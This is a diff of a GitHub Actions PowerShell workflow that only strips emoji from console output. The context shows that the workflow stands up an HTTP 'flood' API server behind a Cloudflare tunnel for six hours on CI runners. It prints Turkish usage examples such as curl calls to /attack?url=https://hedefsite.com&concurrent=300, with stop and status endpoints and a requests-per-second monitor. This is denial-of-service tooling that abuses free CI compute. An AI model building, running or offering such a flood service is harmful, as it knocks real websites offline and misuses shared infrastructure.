@@ -431,36 +431,36 @@ jobs:
         
         Clear-Host
         Write-Host "============================================" -ForegroundColor Green
-        Write-Host "     🚀 FLOOD API SERVER HAZIR! 🚀" -ForegroundColor Cyan
+        Write-Host "     FLOOD API SERVER HAZIR!" -ForegroundColor Cyan
         Write-Host "============================================" -ForegroundColor Green
         Write-Host ""
         
         if ($tunnelUrl) {
-            Write-Host "🌐 PUBLIC URL: $tunnelUrl" -ForegroundColor Yellow
+            Write-Host "PUBLIC URL: $tunnelUrl" -ForegroundColor Yellow
             Write-Host ""
-            Write-Host "📡 API ENDPOINTS:" -ForegroundColor Magenta
+            Write-Host "API ENDPOINTS:" -ForegroundColor Magenta
             Write-Host "   ${tunnelUrl}/attack?url=https://example.com&concurrent=200" -ForegroundColor White
             Write-Host "   ${tunnelUrl}/stop" -ForegroundColor White
             Write-Host "   ${tunnelUrl}/status" -ForegroundColor White
             Write-Host ""
-            Write-Host "💡 Ornek Kullanim:" -ForegroundColor Green
+            Write-Host "Ornek Kullanim:" -ForegroundColor Green
             Write-Host "   curl ${tunnelUrl}/attack?url=https://hedefsite.com&concurrent=300" -ForegroundColor Gray
             Write-Host "   curl ${tunnelUrl}/status" -ForegroundColor Gray
             Write-Host "   curl ${tunnelUrl}/stop" -ForegroundColor Gray
         } else {
-            Write-Host "⚠️ Cloudflare URL bulunamadi!" -ForegroundColor Red
+            Write-Host "Cloudflare URL bulunamadi!" -ForegroundColor Red
             Write-Host ""
             Write-Host "Manuel olarak cloudflared loglarini kontrol edin:" -ForegroundColor Yellow
             Write-Host "   Get-Content .\cloudflared.log" -ForegroundColor Gray
         }
         Write-Host ""
         Write-Host "============================================" -ForegroundColor Green
-        Write-Host "⏱️  Server 6 saat boyunca aktif kalacak" -ForegroundColor Yellow
+        Write-Host "Server 6 saat boyunca aktif kalacak" -ForegroundColor Yellow
         Write-Host "============================================" -ForegroundColor Green
 
     - name: Keep Alive
       run: |
-        Write-Host "`n🔄 Server 6 saat boyunca calisacak..." -ForegroundColor Green
+        Write-Host "`nServer 6 saat boyunca calisacak..." -ForegroundColor Green
         $timeout = 21600
         $elapsed = 0
         while ($elapsed -lt $timeout) {
@@ -469,7 +469,7 @@ jobs:
                 $running = if ($response.running) { "Aktif" } else { "Beklemede" }
                 Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] Status: $running | RPS: $($response.rps) | Total: $($response.totalRequests)" -ForegroundColor Green
             } catch {
-                Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] ⚠️ Status check failed" -ForegroundColor Yellow
+                Write-Host "[$([DateTime]::Now.ToString('HH:mm:ss'))] Status check failed" -ForegroundColor Yellow
             }
             Start-Sleep -Seconds 15
             $elapsed += 15
